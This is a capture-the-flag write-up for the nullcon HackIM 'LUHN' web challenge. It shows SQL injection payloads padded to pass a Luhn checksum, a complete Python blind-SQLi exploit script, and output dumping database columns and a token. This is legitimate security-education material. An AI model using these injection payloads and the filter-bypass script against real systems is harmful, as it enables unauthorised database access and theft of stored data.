# nullcon HackIM : LUHN

**Category:** Web
**Points:** 300
**Solves:** 
**Description:**

> A new service allows you to check if you credit card has been compromised. You just need to enter your credit card number and you instantly know if it has been leaked on the Darknet.
> 
> 
> <http://52.91.163.151/>


## Write-up

by [lanjelot](https://github.com/lanjelot)

The website consists of only one form that POSTs the `cc` parameter.

* Submitting the credit card number 4111111111111111 returns "Your CC has been compromised".
* Submitting a number with an invalid Luhn checksum (e.g. 4111411141114111) returns "Invalid CC".
* Submitting a number with a valid Luhn checksum (e.g. 4123123412341236) returns "We do not have your CC in our database".

The `cc` parameter seems to be vulnerable to SQL injection because `cc=4111111111111111' and 0=0-- ` returns "Your CC has been compromised". However sending `' or 1=1-- ` returns "Invalid CC".

Looks like in order to exploit the SQL injection, our payload must have a valid [Luhn](https://en.wikipedia.org/wiki/Luhn_algorithm) checksum (i.e. 00 is valid but 11 isn't ). So I found this neat Python [project] (https://github.com/benhodgson/baluhn) to generate valid checksums.

And I used my SQLi framework [albatar](https://github.com/lanjelot/albatar) to automate exploitation:

```python
#!/usr/bin/env python

from albatar import *
from baluhn import generate
from urllib import quote

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if 'Your CC has been compromised' in body:
    return 1
  else:
    return 0

def add_luhn(s):
  digits = filter(lambda c: c.isdigit(), s)

  # our payload must have an even number of digits otherwise the serve computes
  # a different checksum than us
  if len(digits) % 2 == 0:
    s += '0'
    digits += '0'

  return quote(s + generate(''.join(digits)))

def mysql_boolean():

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://52.91.163.151/',
      body = 'cc=4111111111111111${injection}',
      method = 'POST',
      response_processor = test_state_grep,
      encode_payload = add_luhn,
      )

  template = "' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask} -- "

  return Method_bitwise(make_requester, template)

sqli = MySQL_Blind(mysql_boolean())

for r in sqli.exploit():
  print r
```

Output:
```
$ python luhn.py --columns
21:35:21 albatar - Executing: ('SELECT COUNT(*) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")', 'SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1')
21:35:22 albatar - count: 4
cccheck:cc:id
cccheck:cc:cc_number
cccheck:token:id
cccheck:token:value
21:35:44 albatar - Time: 23.11 seconds
$ python luhn.py -D cccheck -T token -C value --dump
21:36:02 albatar - Executing: ('SELECT COUNT(*) FROM cccheck.token', 'SELECT CONCAT_WS(0x3a,value) FROM cccheck.token LIMIT ${row_pos},1')
21:36:04 albatar - count: 1
RIeVoh3eeahthu7Ee
21:36:08 albatar - Time: 6.31 seconds
```

## Other write-ups and resources

* none yet
